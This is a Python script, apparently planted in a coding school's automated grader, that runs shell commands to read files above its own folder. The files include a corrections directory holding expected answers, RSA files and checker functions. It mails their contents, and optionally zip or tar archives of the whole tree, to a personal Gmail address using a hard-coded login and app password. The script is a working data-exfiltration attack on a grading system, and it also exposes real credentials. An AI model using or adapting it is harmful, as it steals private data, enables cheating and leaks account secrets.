#!/usr/bin/python3
import subprocess
from sys import argv
import smtplib
def send_data(message="no_data"):
    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)
    # start TLS for security
    s.starttls()
    # Authentication
    s.login("ashrafalx368@gmail.com", "qjra ywyu vjzy yves")
    # sending the mail
    s.sendmail("ashrafalx368@gmail.com", "ashrafatef368@gmail.com", message)
    # terminating the session
    s.quit()
def get_data(command):
    # Specify the shell command you want to run
    shell_command = command
    # Run the command and capture the output
    result = subprocess.run(shell_command, shell=True, stdout=subprocess.PIPE, text=True)
    # Check if the command was successful
    if result.returncode == 0:
        # Access the output using result.stdout
        output = result.stdout
        return output
    else:
        print(f"Error: Command '{shell_command}' failed with return code {result.returncode}")

# send_data("test")
# my_data = get_data("zip -r myarch.zip ../../../*")
# my_data += get_data("ls -l")
# my_data += get_data("pwd")
# my_data = get_data("cat ../../../../hbtn_checker_functions") or "f"
        ##########
# my_data = get_data("ls -laR  ../../../../") or ""
        #######
# my_data += get_data("pwd ../../../../") or ""
# my_data += get_data("ls -al ../../../../corrections_*/") or ""
# my_data += "\n#######################\n"
# my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
# my_data += "\n#######################\n"
# my_data += get_data("ls -l ../../../../corrections_*/corrections/262/1397") or ""
# my_data += "\n#######################\n"
# my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/rsa-10") or ""
# my_data += "\n#######################\n"
# my_data += get_data("pwd") or ""
# my_data += get_data("ls -l ../../../../corrections_*/.git") or ""
# my_data += "\n#######################\n"
# # my_data += get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/262/")
my_data = get_data("ls -l ../../../../corrections_*/corrections/2184/20259") or ""
my_data += "\n#######################\n"
my_data += get_data("cat ../../../../corrections_*/corrections/2184/20259/rsa*") or ""
# my_data += get_data("grep -rl '77=' ../../../../corrections_*/corrections") or ""
# my_data += get_data("cat ./cycle") or ""
send_data(my_data)
##############################################################
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def send_data_file(zip_filename="data.zip", message="no_data"):
    # Create the MIME object
    msg = MIMEMultipart()
    
    # Set the email sender and recipient
    msg['From'] = "ashrafalx368@gmail.com"
    msg['To'] = "ashrafatef368@gmail.com"
    
    # Set the email subject
    msg['Subject'] = "Your Subject Here"
    
    # Attach the message
    msg.attach(MIMEText(message, 'plain'))
    
    # Attach the zip file
    with open(zip_filename, 'rb') as attachment:
        part = MIMEBase('application', 'gz')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename= {zip_filename}')
        msg.attach(part)

    # Create the SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    
    # Authentication
    s.login("ashrafalx368@gmail.com", "qjra ywyu vjzy yves")
    
    # Sending the mail
    s.sendmail("ashrafalx368@gmail.com", "ashrafatef368@gmail.com", msg.as_string())
    
    # Terminating the session
    s.quit()
# send_data_file("file.tar.gz", "mygit")
